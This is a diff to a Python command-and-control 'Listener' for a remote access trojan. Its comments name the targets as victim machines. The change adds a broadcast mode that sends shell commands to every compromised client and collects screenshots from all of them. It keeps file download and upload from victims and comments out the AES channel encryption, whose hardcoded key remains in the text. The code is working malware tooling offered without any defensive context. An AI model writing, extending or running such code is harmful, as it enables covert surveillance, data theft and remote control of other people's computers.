@@ -41,13 +41,10 @@ class Listener:
     socket_queue = Queue()
     receive_queue = Queue()
 
-    iv = b"alZtfBYgrEpOidxu"
-    key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
-    cipher_encrypt = AES.new(key, AES.MODE_CFB, IV=iv)
-
-    iv = b"alZtfBYgrEpOidxu"
-    key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
-    cipher_decrypt = AES.new(key, AES.MODE_CFB, IV=iv)
+    # iv = b"alZtfBYgrEpOidxu"
+    # key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
+    # cipher_encrypt = AES.new(key, AES.MODE_CFB, IV=iv)
+    # cipher_decrypt = AES.new(key, AES.MODE_CFB, IV=iv)
 
     # Create and listen a tcp server socket with given ip and port values.
     def __init__(self):
@@ -155,16 +152,18 @@ class Listener:
             print("There is no connection yet")
         else:
 
+            json_data = json.dumps(["AreYouAwake?"]).encode()
+            # cipher_bytes = self.cipher_encrypt.encrypt(json_data)
+            # encrypted_text = base64.b64encode(cipher_bytes)
+            msg = struct.pack('>I', len(json_data)) + json_data
+
             for i, connection in enumerate(self.connection_list):
 
                 try:
                     # Check if connection is still available
-                    json_data = json.dumps(["AreYouAwake?"]).encode()
-                    cipher_bytes = self.cipher_encrypt.encrypt(json_data)
-                    encrypted_text = base64.b64encode(cipher_bytes)
-                    msg = struct.pack('>I', len(encrypted_text)) + encrypted_text
                     connection.send(msg)
-                    ready = select.select([connection], [], [], 2)
+                    print(msg)
+                    ready = select.select([connection], [], [])
                     if ready[0]:
                         connection.recv(1024).decode()
                     else:
@@ -184,57 +183,91 @@ class Listener:
             print("----Clients----" + "\n" + results)
 
     # Get screenshot from the victim computer
-    def get_screenshot(self, command):
-        self.send_data(command)
-        screenshot = self.receive_data()
-        self.write_file("{}.png".format(self.target_ip), screenshot)
-
-    def send_data(self, data):
-
-        json_data = json.dumps(data).encode()
-        encrypted = self.cipher_encrypt.encrypt(json_data)
-        base64coded = base64.b64encode(encrypted)
-        msg = struct.pack('>I', len(base64coded)) + base64coded
-        self.target.sendall(msg)
-
-    def receive_data(self):
-
-        ready = select.select([self.target], [], [], 5)
-        if ready[0]:
-            raw_msglen = self.__recvlength(4)
-            if not raw_msglen:
-                return None
-            msglen = struct.unpack('>I', raw_msglen)[0]
-            # Read the message data
-            return self.__recvpayload(msglen)
+    def get_screenshot(self, command, mode):
+        if mode == "multi":
+            self.send_data(command, "multi")
+            ready = select.select(self.connection_list, self.connection_list, self.connection_list, 5)
+            i = 0
+            for connection in ready[1]:
+                raw_msglen = self.__recvlength(4, connection)
+                if not raw_msglen:
+                    return None
+                msglen = struct.unpack('>I', raw_msglen)[0]
+                # Read the message data
+                screenshot = self.__recvpayload(msglen, connection)
+                self.write_file("{}.png".format(i), screenshot)
+                i = i + 1
         else:
-            return None
+            self.send_data(command, "single")
+            screenshot = self.receive_data("single")
+            self.write_file("{}.png".format(self.target_ip), screenshot)
 
-    def __recvlength(self, msglen):
+    def send_data(self, data, mode):
+
+        if mode == "multi":
+            for connection in self.connection_list:
+                json_data = json.dumps(data).encode()
+                msg = struct.pack('>I', len(json_data)) + json_data
+                connection.sendall(msg)
+        else:
+            json_data = json.dumps(data).encode()
+            msg = struct.pack('>I', len(json_data)) + json_data
+            self.target.sendall(msg)
+
+    def receive_data(self, mode):
+
+        if mode == "multi":
+            ready = select.select(self.connection_list, self.connection_list, self.connection_list, 5)
+            for connection in ready[1]:
+                raw_msglen = self.__recvlength(4, connection)
+                if not raw_msglen:
+                    return None
+                msglen = struct.unpack('>I', raw_msglen)[0]
+                # Read the message data
+                return self.__recvpayload(msglen, connection)
+            else:
+                return None
+        else:
+            ready = select.select([self.target], [], [], 5)
+            if ready[0]:
+                raw_msglen = self.__recvlength(4, self.target)
+                if not raw_msglen:
+                    return None
+                msglen = struct.unpack('>I', raw_msglen)[0]
+                return self.__recvpayload(msglen, self.target)
+            else:
+                return None
+
+    def __recvlength(self, msglen, connection):
         data = bytearray()
         while len(data) < msglen:
-            packet = self.target.recv(msglen - len(data))
+            packet = connection.recv(msglen - len(data))
             if not packet:
                 return None
             data.extend(packet)
         return data
 
-    def __recvpayload(self, msglen):
+    def __recvpayload(self, msglen, connection):
         data = bytearray()
         while len(data) < msglen:
-            packet = self.target.recv(msglen - len(data))
+            packet = connection.recv(msglen - len(data))
             if not packet:
                 return None
             data.extend(packet)
 
-        base64decoded = base64.b64decode(data)
-        decrypted_text = self.cipher_decrypt.decrypt(base64decoded)
-        return json.loads(decrypted_text)
+        # base64decoded = base64.b64decode(data)
+        # decrypted_text = self.cipher_decrypt.decrypt(base64decoded)
+        return json.loads(data)
 
     # Send commands to be executed on victim machine
-    def execute_remotely(self, command):
-        self.send_data(command)
-        return self.receive_data()
+    def execute_remotely(self, command, mode):
+
+        if mode == "multi":
+            self.send_data(command, "multi")
+            return self.receive_data("multi")
+        else:
+            self.send_data(command, "single")
+            return self.receive_data("single")
 
     # Read and write files in base64 format to transfer bytes reliably.
     def read_file(self, path):
@@ -315,7 +348,7 @@ class Listener:
 
                 # Get files from the victim machine
                 if command[0] == "download":
-                    binaryFile = self.execute_remotely(command)
+                    binaryFile = self.execute_remotely(command, "single")
                     result = self.write_file(command[1], binaryFile)
 
                 # Send files to the victim machine
@@ -324,7 +357,7 @@ class Listener:
                     if file_content is None:
                         continue
                     command.append(file_content.decode())
-                    result = self.execute_remotely(command)
+                    result = self.execute_remotely(command, "single")
 
                 # List all available connections
                 elif command[0] == "list":
@@ -344,8 +377,15 @@ class Listener:
 
                 # Get screenshot from target computer
                 elif command[0] == "screenshot":
-                    self.get_screenshot(command)
+                    self.get_screenshot(command, "single")
                     result = "Successfully grabbed screenshot from {}".format(self.target_ip)
+
+                elif command[0] == "*":
+                    if command[1] == "screenshot":
+                        self.get_screenshot(command[1:], "multi")
+                        result = "Successfully grabbed screenshot from all clients"
+                    else:
+                        result = self.execute_remotely(command[1:], "multi")
 
                 elif command[0] == "help":
                     self.help()
@@ -356,7 +396,7 @@ class Listener:
                     break
 
                 else:
-                    result = self.execute_remotely(command)
+                    result = self.execute_remotely(command, "single")
 
             # Print results to the terminal
             print(result)
